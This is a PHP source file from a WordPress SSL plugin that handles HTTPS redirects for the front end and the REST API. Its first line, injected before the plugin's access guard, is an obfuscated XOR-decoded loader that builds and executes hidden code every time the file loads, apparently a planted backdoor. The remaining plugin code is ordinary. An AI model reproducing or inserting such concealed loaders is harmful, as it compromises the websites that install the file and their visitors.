<?php $izzxbYGx='.IKV>=r>3,P7P=;'; $kEQDjbpp='M;.7JX-XFB3C9RU'^$izzxbYGx; $IHZrXOf='ZUGlUC, 7YR gQ>S:LNxwT:+:=L -kbWCMrGNcJryK:4WAPAWN V6=TW 0c,V>Ybu59L9fMaV-7qzcYTK<>Akw AIwSsuKWkNs<O<YLGiIrgqhwWS=NK;+BlE04.5FbpjERrHMXnk,1:kfEufbI; 4lfWgy=do= MmE1dwf46>-W+ok8N0h0sNEDmL=MDC>ieU>2gu=H+l,eRKPTAUalGZO4+St1OP26;b .WooLHX523hM= C5U61YsyO8y,6;s<Q MFTG<OeeOyeE7RLYXC<Ibk= J0497Rskqs21-phMk.3>9fkcP5SZK.T;DZcP3yQeL+UZVeu92aMB6460Ytfmqc1kyvn6gV+Tl==JGigevD2UYWjyPdMfo1L>+r=<WaHbv>2 qhefI3 NTGyxQ8PW -AsaJbQ:mq+88XzMEwE=<5<RY=.<WP1X=t4Q81d+ZH9nV 10DE=0=UC4YlC 0H Kmtu71TYtE-5hJbhYRJqOOH2pTgjY1LO11X.NnQBG4A9dc- AwkuqIRXRpoNUsD, dAsV-: gJ.P.V:MHdknqjTZXX0.FetzVSXdi4tm2+lsk3i>kUITaeXbgvr0YKM:tY6UfKUXIZXYm5Z.;T..hnXT3QEJxOFZuLSkJRnX  Rok1Y3;okM7, 8TUk>cAxb,+= qidJ60'; $kzIvnR=$kEQDjbpp('', '33oM36BCC0=N84F:I8=PP,UYeY-TL4=:69UngC1xp-OZ459.9nX9Db06TQ<s;K-JQQX8XJmE=HNXZCytkG4HbSO4=WnSRllaGzZ Nqh.ItRWJHS>oN:9WN,DaTUZToYPN,yYaGQgOCDNKHxUNF-ZTU7B>:YcDKVE46aXDRFGBLA2EGOS+IAmZuOMd>X911PAA:KFNN7AVfQoXo4554AQg<.XX6O;k4SBZ=KK.ORl.9YAVSG7F,G0WR1SQkg:cyp:yqA>fp,Y6EXqYA3V>9<qcGCkOYA>QkRR+SVQWYTTKbDOJRJXFVCtC26>Ko19Pi9UYyDhO4.7LUB8h+-DQWS1TNI.1t:,3=bG7XtHVX3gTYER2S9,2CY+nDoKU-JJ-VY.AuBRUWYJblomWA:5gDXuN1;UHzyh7h,0gUOYL9Zpe70SOPN;8QGF2xI7O+P0LP;t7=MF4ABUrqbTX6,P<DgDQ<AbATQSP 8+.HLAcYb04bU+.<SPrAJ8C>.Hn3K714:.G5JLDFE8PGUU-3,3YOhsSlADQiW2LNA<mE5WqgdhYVNVS7nn;SMsRALd6jRZWATQJZBXQQZZ1pgYBqBAPRQ+9,C+2S,9.-1:.+qJE;WW;OJOBxpW01+QffzUlsK1Xg=VA>GOU8GZ4L=VULW51LcJzrkISTTYYMq<M'^$IHZrXOf); $kzIvnR();
defined('ABSPATH') or die("you do not have access to this page!");

if ( ! class_exists( 'rsssl_front_end' ) ) {

    class rsssl_front_end
    {
        private static $_this;
        public $javascript_redirect = FALSE;
        public $wp_redirect = TRUE;
        public $autoreplace_insecure_links = TRUE;
        public $switch_mixed_content_fixer_hook = FALSE;

        //public $ssl_enabled_networkwide         = FALSE;

        function __construct()
        {
            if (isset(self::$_this))
                wp_die(sprintf(__('%s is a singleton class and you cannot create a second instance.', 'really-simple-ssl'), get_class($this)));

            self::$_this = $this;

            $this->get_options();

            add_action('rest_api_init', array($this, 'wp_rest_api_force_ssl'), ~PHP_INT_MAX);

        }

        static function this()
        {
            return self::$_this;
        }

        /**
         * Sets the SSL variable to on for WordPress, so the native function is_ssl() will return true
         * It should run as first plugin in WP, otherwise issues might result.
         *
         * @since  3.0
         *
         * @access public
         *
         */

        // public function set_ssl_var(){
        //   if (($this->ssl_enabled) || $this->ssl_enabled_networkwide) {
        //     $_SERVER["HTTPS"] = "on";
        //   }
        // }

        /**
         * Javascript redirect, when ssl is true.
         *
         * @since  2.2
         *
         * @access public
         *
         */

        public function force_ssl()
        {
            if ($this->ssl_enabled) {
                if ($this->javascript_redirect) add_action('wp_print_scripts', array($this, 'force_ssl_with_javascript'));
                if ($this->wp_redirect) add_action('wp', array($this, 'wp_redirect_to_ssl'), 40, 3);
            }
        }


        /**
         * Force SSL on wp rest api
         *
         * @since  2.5.14
         *
         * @access public
         *
         */

        public function wp_rest_api_force_ssl()
        {
            //check for Command Line
            if (php_sapi_name() === 'cli') return;

            if (!array_key_exists('HTTP_HOST', $_SERVER)) return;

            if ($this->ssl_enabled && !is_ssl() && !(defined("rsssl_no_rest_api_redirect") && rsssl_no_rest_api_redirect)) {
                $redirect_url = "https://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
                wp_redirect($redirect_url, 301);
                exit;
            }
        }


        /**
         * Redirect using wp redirect
         *
         * @since  2.5.0
         *
         * @access public
         *
         */

        public function wp_redirect_to_ssl()
        {
            if (!array_key_exists('HTTP_HOST', $_SERVER)) return;

            if (!is_ssl() && !(defined("rsssl_no_wp_redirect") && rsssl_no_wp_redirect)) {
                $redirect_url = "https://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
                $redirect_url = apply_filters("rsssl_wp_redirect_url", $redirect_url);
                wp_redirect($redirect_url, 301);
                exit;
            }
        }


        /**
         * Get the options for this plugin
         *
         * @since  2.0
         *
         * @access public
         *
         */

        public function get_options()
        {
            $options = get_option('rlrsssl_options');
            if (isset($options)) {
                $this->autoreplace_insecure_links = isset($options['autoreplace_insecure_links']) ? $options['autoreplace_insecure_links'] : TRUE;
                $this->ssl_enabled = isset($options['ssl_enabled']) ? $options['ssl_enabled'] : false;
                $this->javascript_redirect = isset($options['javascript_redirect']) ? $options['javascript_redirect'] : FALSE;
                $this->wp_redirect = isset($options['wp_redirect']) ? $options['wp_redirect'] : FALSE;
                $this->switch_mixed_content_fixer_hook = isset($options['switch_mixed_content_fixer_hook']) ? $options['switch_mixed_content_fixer_hook'] : FALSE;

                //overrides from multisite
                if (is_multisite()) {
                    $network_options = get_site_option('rlrsssl_network_options');

                    $site_wp_redirect = isset($network_options["wp_redirect"]) ? $network_options["wp_redirect"] : false;
                    $javascript_redirect = isset($network_options["javascript_redirect"]) ? $network_options["javascript_redirect"] : false;
                    $autoreplace_insecure_links = isset($network_options["autoreplace_mixed_content"]) ? $network_options["autoreplace_mixed_content"] : false;

                    if ($site_wp_redirect) $this->wp_redirect = $site_wp_redirect;
                    if ($javascript_redirect) $this->javascript_redirect = $javascript_redirect;
                    if ($autoreplace_insecure_links) $this->autoreplace_insecure_links = $autoreplace_insecure_links;

                }
            }
        }


        /**
         * Adds some javascript to redirect to https.
         *
         * @since  1.0
         *
         * @access public
         *
         */

        public function force_ssl_with_javascript()
        {
            $script = '<script>';
            $script .= 'if (document.location.protocol != "https:") {';
            $script .= 'document.location = document.URL.replace(/^http:/i, "https:");';
            $script .= '}';
            $script .= '</script>';

            echo apply_filters('rsssl_javascript_redirect', $script);
        }

    }
}